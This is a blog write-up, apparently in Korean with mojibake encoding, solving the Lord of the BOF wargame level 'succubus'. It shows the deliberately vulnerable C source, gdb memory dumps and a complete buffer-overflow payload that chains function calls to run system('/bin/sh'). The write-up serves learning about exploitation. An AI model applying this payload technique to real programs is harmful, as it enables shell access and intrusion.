---
layout: post
title:  "[LOB]Level17. succubus"
subtitle:   "[LOB]zombie_assassin â†’ succubus"
categories: Wargame[LOB]
tags:
- Wargame
- LOB
- Write-up
---

## keyword : function calls

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - succubus
        - calling functions continuously
*/

#include <stdio.h>
#include <stdlib.h>
#include <dumpcode.h>

// the inspector
int check = 0;

void MO(char *cmd)
{
    if(check != 4)
    	exit(0);

    printf("welcome to the MO!\n");

	// olleh!
	system(cmd);
}

void YUT(void)
{
    if(check != 3)
    	exit(0);

    printf("welcome to the YUT!\n");
    check = 4;
}

void GUL(void)
{
    if(check != 2)
    	exit(0);

    printf("welcome to the GUL!\n");
    check = 3;
}

void GYE(void)
{
	if(check != 1)
		exit(0);

	printf("welcome to the GYE!\n");
	check = 2;
}

void DO(void)
{
	printf("welcome to the DO!\n");
	check = 1;
}

main(int argc, char *argv[])
{
	char buffer[40];
	char *addr;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// you cannot use library
	if(strchr(argv[1], '\x40')){
		printf("You cannot use library\n");
		exit(0);
	}

	// check address
	addr = (char *)&DO;
    if(memcmp(argv[1]+44, &addr, 4) != 0){
    	printf("You must fall in love with DO\n");
        exit(0);
    }

    // overflow!
    strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

    // stack destroyer
	// 100 : extra space for copied argv[1]
    memset(buffer, 0, 44);
	memset(buffer+48+100, 0, 0xbfffffff - (int)(buffer+48+100));

	// LD_* eraser
	// 40 : extra space for memset function
	memset(buffer-3000, 0, 3000-40);
}
```

\x40 ì£¼ì†Œê°€ í•„í„°ë§ ë˜ì–´ ìˆì–´ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì£¼ì†Œë¥¼ ì‚¬ìš©í•˜ì§€ëª»í•œë‹¤.

```c
int memcmp(const void *s1, const void *s2, size_t n);
```

- s1ì˜ ë©”ëª¨ë¦¬ì˜ì—­ê³¼  s2ì˜ ë©”ëª¨ë¦¬ ì˜ì—­ì˜ ì²˜ìŒ n ë°”ì´íŠ¸ë¥¼ ë¹„êµí•œë‹¤.
- s1 < s2 ì´ë©´ 0ë³´ë‹¤ ì‘ì€ ì •ìˆ˜ ë°˜í™˜
- s1 = s2 ì´ë©´ 0 ë°˜í™˜
- s1 > s2 ì´ë©´ 0ë³´ë‹¤ í° ì •ìˆ˜ ë°˜í™˜

```c
void *memset(void *dest, int c, size_t count);
```

- destì˜ ì²«ë²ˆì§¸ countë°”ì´íŠ¸ë¥¼ ê°’ unsigned cë¡œ ì„¤ì •í•œë‹¤.
- dest : ë©”ëª¨ë¦¬ì˜ í¬ê¸°ë¥¼ ë³€ê²½í•  í¬ì¸í„°
- c : ì´ˆê¸°í™” ê°’
- size : ì´ˆê¸°í™” ê¸¸ì´
- destì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ë¦¬í„´ / ì‹¤íŒ¨ì‹œ NULL ë¦¬í„´



```c
// check address
	addr = (char *)&DO;
    if(memcmp(argv[1]+44, &addr, 4) != 0){
    	printf("You must fall in love with DO\n");
        exit(0);
    }
```

```assembly
0x8048860 <main+88>:	mov    DWORD PTR [%ebp-44],0x80487ec	#addr = &DO
0x8048867 <main+95>:	push   4
0x8048869 <main+97>:	lea    %eax,[%ebp-44]	#ebp-44 = &addr
0x804886c <main+100>:	push   %eax
0x804886d <main+101>:	mov    %eax,DWORD PTR [%ebp+12] #ebp+12 = argv[1]
0x8048870 <main+104>:	add    %eax,4
0x8048873 <main+107>:	mov    %edx,DWORD PTR [%eax]
0x8048875 <main+109>:	add    %edx,44
0x8048878 <main+112>:	push   %edx
0x8048879 <main+113>:	call   0x804842c <memcmp>
```

&DO = 0x080487ec

argv[1]ì˜ 44ë²ˆì§¸ë¶€í„° 4byteë§Œí¼ì€ addrì˜ ì£¼ì†Œì™€ ë¹„êµí•œë‹¤.

payload ì‹œë‚˜ë¦¬ì˜¤ : `|dummy(44)|&DO|`

> check addressëŠ” í†µê³¼í–ˆìœ¼ë‹ˆ ì „ì—­ë³€ìˆ˜ check ê°’ì„ 4ë¡œ ë§Œë“¤ê³  MOí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ ë  ë“¯ ğŸ˜Š

checkë¥¼ 4ë¡œ ë§Œë“¤ê¸° ìœ„í•´ì„œëŠ” 

1. DO í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ check = 1 ë§Œë“¤ê³ 
2. GYEí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ check = 2 ë§Œë“¤ê³ 
3. GULí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ check = 3 ë§Œë“¤ê³ 
4. YUTí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ check = 4 ë§Œë“ ë‹¤.

ìµœì¢…ì ìœ¼ë¡œ MOí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ Finish!! ğŸ‘ŒğŸ‘ŒğŸ‘ŒğŸ‘ŒğŸ‘Œ



&main(ebp) : 0xbffffae8

&DO : 0x80487ec

&GYE : 0x80487bc

&GUL : 0x804878c

&YUT : 0x804875c

&MO : 0x8048724

payload ì‹œë‚˜ë¦¬ì˜¤ : `| dummy(44) | &DO | &GYE | &GUL | &YUT | &MO |`



```c
void MO(char *cmd)
{
    if(check != 4)
    	exit(0);

    printf("welcome to the MO!\n");

	// olleh!
	system(cmd);
}
```

ë§ˆì§€ë§‰ MO í•¨ìˆ˜ëŠ” ì¸ìê°’ìœ¼ë¡œ cmdì˜ ì£¼ì†Œê°’ì„ ê°€ì ¸ì˜¨ë‹¤.

í•¨ìˆ˜ì˜ ì¸ìê°’ì€ í•´ë‹¹ í•¨ìˆ˜ì˜ ebp+8ë¶€í„° ì‹œì‘ëœë‹¤. *(ebp+4ëŠ” RETì˜ì—­)*

ë¼ì´ë¸ŒëŸ¬ë¦¬ì£¼ì†Œë¥¼ ì°¸ì¡° ëª»í•˜ë¯€ë¡œ, ë‹¤ë¥¸ ê³³ì—ì„œ "/bin/sh"ë¥¼ ê°€ì ¸ì™€ì•¼ í•œë‹¤.

"/bin/sh"ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” ê²½ìš°ì˜ ìˆ˜

1. í™˜ê²½ë³€ìˆ˜
   - í™˜ê²½ë³€ìˆ˜ëŠ” mainí•¨ìˆ˜ ë°‘ì— argê°’ ë°‘ì— í™˜ê²½ë³€ìˆ˜ê°€ ë“¤ì–´ê°„ë‹¤.
   - í•´ë‹¹ ì½”ë“œì—ì„œ buffer+48+100ë¶€ë¶„ë¶€í„° 0xbfffffffê¹Œì§€ 0ìœ¼ë¡œ ì´ˆê¸°í™” ë˜ë¯€ë¡œ í™˜ê²½ë³€ìˆ˜ë„ ì´ˆê¸°í™” ëœë‹¤.
2. systemí•¨ìˆ˜ ë‚´ë¶€(ë¼ì´ë¸ŒëŸ¬ë¦¬)
   - systemí•¨ìˆ˜ëŠ” ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ì¡´ì¬í•˜ëŠ”ë° ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” '0x40'ìœ¼ë¡œ ì‹œì‘ëœë‹¤. ì´ëŠ” í•„ëŸ¬ë§ ë˜ê³  ìˆë‹¤.
3. mainì˜ argv[1]
   - argv[1] ë‚´ë¶€ì— "/bin/sh"ì„ ì…ë ¥í•˜ê³  í•´ë‹¹ ì£¼ì†Œë¥¼ ë„£ì–´ì¤„ ìˆ˜ ìˆë‹¤.
4. mainì˜ argv[2]
   - argv[2] ë„ buffer+48+100 ë¶€ë¶„ë§Œ ë„˜ì§€ ì•Šìœ¼ë©´ ê°€ëŠ¥ í•  ê²ƒ ê°™ë‹¤.

1ë²ˆ, 2ë²ˆ ë°©ë²•ì„ ë¶ˆê°€ëŠ¥í•˜ë¯€ë¡œ, 3ë²ˆ ë°©ë²• argv[1]ìì²´ ë‚´ë¶€ì— "/bin/sh"ë¥¼ ë„£ê³  í•´ë‹¹ ì£¼ì†Œë¥¼ êµ¬í•´ë³´ì.

`|dummy(44)|&DO|&GYE|&GUL|&YUT|&MO|dummy(4)|\xbf\xbf\xbf\xbf|"/bin/sh"|`

```c
(gdb) x/32x $ebp
0xbffffa7c:	0x00000000	0x90909090	0xbfbfbfbf	0x6e69622f
0xbffffa8c:	0x0068732f	0x08048808	0x00000002	0xbffffab4
0xbffffa9c:	0x0804839c	0x0804894c	0x4000ae60	0xbffffaac
```

0xbfbfbfbf ê°€ ë“¤ì–´ê°„ ì´í›„ë¥¼ ë³´ë‹ˆ "'/bin/sh"ë¬¸ìì—´ì´ ASCII ì½”ë“œë¡œ ë“¤ì–´ê°€ ìˆë‹¤. ì´ ì£¼ì†Œë¥¼ êµ¬í•´ë³´ë©´ 0xbffffa88 ê°€ ëœë‹¤. ì´ ì£¼ì†Œë¥¼ 0xbfbfbfbfì— ë„£ìœ¼ë©´ ë„ì!

```python
string = "/bin/sh"
for x in string: 
    hex(ord(x))
...
'0x2f'
'0x62'
'0x69'
'0x6e'
'0x2f'
'0x73'
'0x68'
```

&"/bin/sh" : 0xbffffab8

payload ì‹œë‚˜ë¦¬ì˜¤ :

`|dummy(44)|&DO|&GYE|&GUL|&YUT|&MO|dummy(4)|\xb8\xfa\xff\xbf|"/bin/sh"|`

payload :

```sh
./succubus `python -c 'print "A"*44+"\xec\x87\x04\x08"+"\xbc\x87\x04\x08"+"\x8c\x87\x04\x08"+"\x5c\x87\x04\x08"+"\x24\x87\x04\x08"+"\x90"*4+"\xb8\xfa\xff\xbf"+"/bin/sh"'`
```



**succubus / hear to stay**